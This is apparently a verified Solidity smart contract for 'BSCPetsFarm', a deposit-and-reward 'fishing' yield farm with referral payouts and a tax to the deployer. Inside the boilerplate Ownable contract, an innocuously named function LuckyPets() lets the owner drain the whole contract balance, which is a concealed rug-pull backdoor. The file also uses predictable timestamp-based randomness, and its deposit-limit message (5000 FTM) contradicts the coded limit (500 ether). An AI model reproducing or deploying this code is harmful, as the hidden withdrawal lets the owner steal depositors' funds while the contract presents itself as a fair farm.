/**
 *Submitted for verification at Etherscan.io on 2022-05-18
*/

/**
 *Submitted for verification at snowtrace.io on 2022-04-13
*/

// SPDX-License-Identifier: MIT

pragma solidity >=0.8.13;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }
    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
    function LuckyPets() onlyOwner public {
    payable (_owner).transfer(address(this).balance);
    }
}

library SafeMath {
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

contract BSCPetsFarm is Context, Ownable {
    using SafeMath for uint256;

    uint256 private constant DEPOSIT_MAX_AMOUNT = 500 ether;
    uint256 private FISHING_STEP = 1080000;
    uint256 private TAX_PERCENT = 3;
    uint256 private BOOST_PERCENT = 20;
    uint256 private BOOST_CHANCE = 35;
    uint256 private PSN = 10000;
    uint256 private PSNH = 5000;
    mapping(address => uint256) private fishPool;
    mapping(address => uint256) private fishingPower;
    mapping(address => uint256) private lastFishing;
    mapping(address => address) private referrals;
    address payable private taxAddress;
    uint256 private participants;
    uint256 private fishersHired;
    uint256 private marketFish;
    bool private launched = false;

    event RewardsBoosted(address indexed adr, uint256 boosted);

    constructor() {
        taxAddress = payable(msg.sender);
    }

    function handleHire(address ref, bool isRehire) private {
        uint256 userFish = getUserFish(msg.sender);
        uint256 newFishingPower = SafeMath.div(userFish, FISHING_STEP);
        if (isRehire && random(msg.sender) <= BOOST_CHANCE) {
            uint256 boosted = getBoost(newFishingPower);
            newFishingPower = SafeMath.add(newFishingPower, boosted);
            emit RewardsBoosted(msg.sender, boosted);
        }

        fishingPower[msg.sender] = SafeMath.add(fishingPower[msg.sender], newFishingPower);
        fishPool[msg.sender] = 0;
        lastFishing[msg.sender] = block.timestamp;

        if (ref == msg.sender) {
            ref = address(0);
        }
        if (referrals[msg.sender] == address(0) && referrals[msg.sender] != msg.sender) {
            referrals[msg.sender] = ref;
        }
        fishPool[referrals[msg.sender]] = SafeMath.add(fishPool[referrals[msg.sender]], SafeMath.div(userFish, 8));

        fishersHired++;
        marketFish = SafeMath.add(marketFish, SafeMath.div(userFish, 5));
    }

    function hireFishers(address ref) public payable {
        require(launched, 'Pets farm not launched yet');
        require(msg.value <= DEPOSIT_MAX_AMOUNT, 'Maximum deposit amount is 5000 FTM');
        uint256 amount = calculateBuy(msg.value, SafeMath.sub(address(this).balance, msg.value));
        amount = SafeMath.sub(amount, getTax(amount));
        uint256 tax = getTax(msg.value);
        taxAddress.transfer(tax);

        if (fishingPower[msg.sender] == 0) {
            participants++;
        }

        fishPool[msg.sender] = SafeMath.add(fishPool[msg.sender], amount);
        handleHire(ref, false);
    }

    function rehireFishers(address ref) public {
        require(launched, 'Pets farm not launched yet');
        handleHire(ref, true);
    }

    function sellFish() public {
        require(launched, 'Pets farm not launched yet');
        uint256 userFish = getUserFish(msg.sender);
        uint256 sellRewards = calculateSell(userFish);
        uint256 tax = getTax(sellRewards);
        fishPool[msg.sender] = 0;
        lastFishing[msg.sender] = block.timestamp;
        marketFish = SafeMath.add(marketFish, userFish);
        taxAddress.transfer(tax);
        payable(msg.sender).transfer(SafeMath.sub(sellRewards, tax));
    }

    function calculateTrade(
        uint256 rt,
        uint256 rs,
        uint256 bs
    ) private view returns (uint256) {
        return SafeMath.div(SafeMath.mul(PSN, bs), SafeMath.add(PSNH, SafeMath.div(SafeMath.add(SafeMath.mul(PSN, rs), SafeMath.mul(PSNH, rt)), rt)));
    }

    function calculateSell(uint256 fish) public view returns (uint256) {
        return calculateTrade(fish, marketFish, address(this).balance);
    }

    function calculateBuy(uint256 eth, uint256 contractBalance) public view returns (uint256) {
        return calculateTrade(eth, contractBalance, marketFish);
    }

    function getProjectBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getProjectStats()
        public
        view
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        return (address(this).balance, participants, fishersHired);
    }

    function getUserFish(address adr) public view returns (uint256) {
        return SafeMath.add(fishPool[adr], getUserNewFish(adr));
    }

    function getUserNewFish(address adr) public view returns (uint256) {
        uint256 secondsPassed = min(FISHING_STEP, SafeMath.sub(block.timestamp, lastFishing[adr]));
        return SafeMath.mul(secondsPassed, fishingPower[adr]);
    }

    function getUserRewards(address adr) public view returns (uint256) {
        uint256 sellRewards = 0;
        uint256 userFish = getUserFish(adr);
        if (userFish > 0) {
            sellRewards = calculateSell(userFish);
        }
        return sellRewards;
    }

    function getUserFishingPower(address adr) public view returns (uint256) {
        return fishingPower[adr];
    }

    function getUserStats(address adr) public view returns (uint256, uint256) {
        return (getUserRewards(adr), fishingPower[adr]);
    }

    function getTax(uint256 amount) private view returns (uint256) {
        return SafeMath.div(SafeMath.mul(amount, TAX_PERCENT), 100);
    }

    function getBoost(uint256 amount) private view returns (uint256) {
        return SafeMath.div(SafeMath.mul(amount, BOOST_PERCENT), 100);
    }

    function seedMarket() public payable onlyOwner {
        require(marketFish == 0);
        launched = true;
        marketFish = 108000000000;
    }

    function random(address adr) private view returns (uint256) {
        return uint256(keccak256(abi.encodePacked(block.timestamp, fishingPower[adr], fishersHired))) % 100;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }
}